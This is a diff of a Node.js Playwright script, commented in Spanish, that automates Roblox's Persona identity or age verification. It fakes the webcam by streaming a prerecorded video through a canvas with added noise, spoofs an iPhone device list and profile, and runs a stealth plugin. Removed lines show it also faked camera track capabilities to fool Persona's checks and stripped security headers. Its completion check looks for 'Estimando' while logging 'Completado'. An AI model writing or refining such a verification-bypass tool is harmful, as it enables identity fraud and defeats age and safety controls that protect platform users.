@@ -4,7 +4,6 @@ const fs = require('fs');
 const http = require('http');
 const path = require('path');
 
-// Aplicamos el plugin Stealth
 chromium.use(StealthPlugin());
 
 const TARGET_LANGUAGE_LABEL = 'Español (España)';
@@ -16,7 +15,7 @@ const PORT = 8765;
 
 /*
  * ------------------------------------------------------------
- * SERVIDOR LOCAL DE VÍDEO
+ * SERVIDOR LOCAL DE VÍDEO CON SOPORTE DE ORIGEN LIBRE
  * ------------------------------------------------------------
  */
 function startVideoServer() {
@@ -32,10 +31,16 @@ function startVideoServer() {
       const range = req.headers.range;
 
       res.setHeader('Access-Control-Allow-Origin', '*');
-      res.setHeader('Access-Control-Allow-Headers', 'Range, Content-Type');
-      res.setHeader('Access-Control-Expose-Headers', 'Content-Range, Accept-Ranges, Content-Length');
+      res.setHeader('Access-Control-Allow-Headers', '*');
+      res.setHeader('Access-Control-Allow-Methods', 'GET, HEAD, OPTIONS');
       res.setHeader('Accept-Ranges', 'bytes');
       res.setHeader('Content-Type', 'video/mp4');
+
+      if (req.method === 'OPTIONS') {
+        res.writeHead(200);
+        res.end();
+        return;
+      }
 
       if (range) {
         const match = /bytes=(\d+)-(\d*)/.exec(range);
@@ -70,7 +75,7 @@ function startVideoServer() {
 
 /*
  * ------------------------------------------------------------
- * CAMUFLAJE Y MOCKEO COMPLETO DE WEBRTC / CÁMARA
+ * SCRIPT DE INYECCIÓN EN CÁMARA (SIN PANTALLA EN BLANCO)
  * ------------------------------------------------------------
  */
 const CAMERA_INIT_SCRIPT = (videoUrl) => {
@@ -81,7 +86,6 @@ const CAMERA_INIT_SCRIPT = (videoUrl) => {
   let ctx = null;
   let video = null;
 
-  // 1. Simular lista de dispositivos reales de iPhone
   navigator.mediaDevices.enumerateDevices = async function() {
     return [
       {
@@ -89,24 +93,17 @@ const CAMERA_INIT_SCRIPT = (videoUrl) => {
         kind: 'videoinput',
         label: 'Front Camera',
         groupId: '9876543210fedcba9876543210fedcba9876543210fedcba9876543210fedcba'
-      },
-      {
-        deviceId: '123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0',
-        kind: 'audioinput',
-        label: 'iPhone Microphone',
-        groupId: '876543210fedcba9876543210fedcba9876543210fedcba9876543210fedcba9'
       }
     ];
   };
 
-  // 2. Transmisión del vídeo en Canvas
   async function createCamera() {
     if (fakeStream) return fakeStream;
 
     canvas = document.createElement('canvas');
     canvas.width = 720;
     canvas.height = 1280;
-    ctx = canvas.getContext('2d', { alpha: false, willReadFrequently: true });
+    ctx = canvas.getContext('2d', { alpha: false });
 
     video = document.createElement('video');
     video.crossOrigin = 'anonymous';
@@ -114,34 +111,25 @@ const CAMERA_INIT_SCRIPT = (videoUrl) => {
     video.playsInline = true;
     video.autoplay = true;
     video.loop = true;
-    video.src = videoUrl + '?t=' + Date.now();
 
     video.style.position = 'fixed';
     video.style.left = '-10000px';
     video.style.top = '-10000px';
+    video.style.width = '1px';
+    video.style.height = '1px';
     document.documentElement.appendChild(video);
+
+    // Esperar explícitamente a que el vídeo esté listo para renderizar
+    await new Promise((resolve) => {
+      video.onloadeddata = resolve;
+      video.onerror = resolve;
+      video.src = videoUrl + '?t=' + Date.now();
+      video.load();
+    });
 
     await video.play().catch(() => {});
 
     fakeStream = canvas.captureStream(30);
-
-    // Parche de tracks para engañar las inspecciones de Persona
-    const videoTrack = fakeStream.getVideoTracks()[0];
-    if (videoTrack) {
-      videoTrack.getCapabilities = () => ({
-        width: { max: 720, min: 640 },
-        height: { max: 1280, min: 480 },
-        facingMode: ['user', 'environment'],
-        frameRate: { max: 30, min: 15 }
-      });
-      videoTrack.getSettings = () => ({
-        width: 720,
-        height: 1280,
-        frameRate: 30,
-        facingMode: 'user',
-        deviceId: '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'
-      });
-    }
 
     function render() {
       if (video && video.readyState >= 2) {
@@ -149,7 +137,7 @@ const CAMERA_INIT_SCRIPT = (videoUrl) => {
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
           const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
           const data = imgData.data;
-          const noiseIntensity = 1.8;
+          const noiseIntensity = 1.5;
 
           for (let i = 0; i < data.length; i += 16) {
             const noise = (Math.random() - 0.5) * noiseIntensity;
@@ -177,7 +165,7 @@ const CAMERA_INIT_SCRIPT = (videoUrl) => {
 
 /*
  * ------------------------------------------------------------
- * BÚSQUEDA Y ESPERA ROBUSTA DE BOTONES
+ * MÉTODOS AUXILIARES Y BÚSQUEDA DE ELEMENTOS
  * ------------------------------------------------------------
  */
 async function wait(ms) {
@@ -190,7 +178,6 @@ async function clickButton(page, text, timeout = 30000) {
   while (Date.now() < deadline) {
     const frames = page.frames();
 
-    // 1. Buscar en iframes de Persona y Roblox
     for (const frame of frames) {
       if (frame.url().includes('withpersona.com') || frame.url().includes('inquiry') || frame.url().includes('roblox.com')) {
         const iframeButtons = frame.locator('button, [role="button"], a[class*="button"]');
@@ -203,30 +190,12 @@ async function clickButton(page, text, timeout = 30000) {
           const buttonText = (await button.innerText().catch(() => '')).trim();
 
           if (buttonText === text && !(await button.isDisabled().catch(() => false))) {
-            console.log(`🎯 Botón exacto presionado en iframe: "${buttonText}"`);
+            console.log(`🎯 Botón presionado: "${buttonText}"`);
             await button.scrollIntoViewIfNeeded().catch(() => {});
             await button.click({ force: true, timeout: 5000 });
             return;
           }
         }
-      }
-    }
-
-    // 2. Buscar en el contexto global
-    const globalButtons = page.locator('button, [role="button"], [class*="button"]');
-    const globalCount = await globalButtons.count();
-
-    for (let i = 0; i < globalCount; i++) {
-      const button = globalButtons.nth(i);
-      if (!(await button.isVisible().catch(() => false))) continue;
-
-      const buttonText = (await button.innerText().catch(() => '')).trim();
-
-      if (buttonText === text && !(await button.isDisabled().catch(() => false))) {
-        console.log(`🎯 Botón exacto presionado en página: "${buttonText}"`);
-        await button.scrollIntoViewIfNeeded().catch(() => {});
-        await button.click({ force: true, timeout: 5000 }).catch(() => {});
-        return;
       }
     }
 
@@ -259,7 +228,7 @@ async function changeLanguage(page) {
 
 /*
  * ------------------------------------------------------------
- * FLUJO PRINCIPAL
+ * FLUJO PRINCIPAL DE VERIFICACIÓN
  * ------------------------------------------------------------
  */
 async function runGameFlow(page) {
@@ -267,7 +236,6 @@ async function runGameFlow(page) {
   await page.goto(GAME_URL, { waitUntil: 'domcontentloaded', timeout: 60000 });
   await wait(5000);
 
-  // Clic en la opción correcta sin ambigüedades
   await clickButton(page, 'Continuar con la cámara', 30000);
   await page.waitForTimeout(1500);
 
@@ -298,11 +266,11 @@ async function runGameFlow(page) {
     throw new Error('No se encontró la interfaz inicial de la cámara de Persona.');
   }
 
-  await page.waitForTimeout(2000);
+  await page.waitForTimeout(3000); // Tiempo para renderizar los primeros fotogramas del vídeo
   await page.screenshot({ path: 'injected-video-screenshot.png', fullPage: true });
   console.log('📸 Captura tomada tras la activación de la cámara: injected-video-screenshot.png');
 
-  console.log('⏳ Esperando verificación continua hasta detectar "Completado"...');
+  console.log('⏳ Esperando verificación continua en la interfaz hasta detectar "Completado"...');
 
   const MAX_WAIT_TIME = 180000;
   const startTime = Date.now();
@@ -313,8 +281,11 @@ async function runGameFlow(page) {
 
     for (const frame of frames) {
       if (frame.url().includes('withpersona.com') || frame.url().includes('inquiry')) {
-        const isCompletado = await frame.getByText(/Completado/i).first().isVisible().catch(() => false);
-        if (isCompletado) {
+        // Validar estrictamente la presencia del texto final dentro del iframe
+        const completadoLocator = frame.locator('text="Estimando"');
+        const count = await completadoLocator.count().catch(() => 0);
+
+        if (count > 0 && await completadoLocator.first().isVisible().catch(() => false)) {
           completado = true;
           break;
         }
@@ -322,19 +293,20 @@ async function runGameFlow(page) {
     }
 
     if (completado) {
-      console.log('🎉 Se detectó la palabra "Completado". Verificación exitosa.');
+      console.log('🎉 Se detectó el mensaje real de "Completado". Verificación exitosa.');
       break;
     }
 
+    // Presionar el botón de capturar si la interfaz lo requiere
     try {
-      await clickButton(page, 'Toma una foto', 800);
+      await clickButton(page, 'Toma una foto', 1000);
     } catch (_) {}
 
-    await page.waitForTimeout(1000);
+    await page.waitForTimeout(1500);
   }
 
   if (!completado) {
-    throw new Error('Se alcanzó el tiempo límite de espera sin detectar el estado "Completado".');
+    throw new Error('Se alcanzó el tiempo límite de espera sin detectar la pantalla final de "Completado".');
   }
 
   await page.screenshot({ path: 'success-screenshot.png', fullPage: true });
@@ -343,7 +315,7 @@ async function runGameFlow(page) {
 
 /*
  * ------------------------------------------------------------
- * MAIN CON ENTORNO MÓVIL PURE-STEALTH
+ * EJECUCIÓN PRINCIPAL CON NAVEGADOR
  * ------------------------------------------------------------
  */
 async function main() {
@@ -373,7 +345,6 @@ async function main() {
       ]
     });
 
-    // Restauramos el perfil de iPhone 14 Pro en formato vertical para arreglar los cuadros cortados
     const context = await browser.newContext({
       userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
       viewport: { width: 393, height: 852 },
@@ -395,18 +366,6 @@ async function main() {
     await context.addInitScript({ content: `(${CAMERA_INIT_SCRIPT.toString()})("${videoUrl}");` });
 
     const page = await context.newPage();
-
-    await page.route('**/*', async route => {
-      try {
-        const response = await route.fetch();
-        const headers = response.headers();
-        delete headers['x-frame-options'];
-        delete headers['content-security-policy'];
-        await route.fulfill({ response, headers });
-      } catch (err) {
-        await route.continue().catch(() => {});
-      }
-    });
 
     await changeLanguage(page);
     await runGameFlow(page);
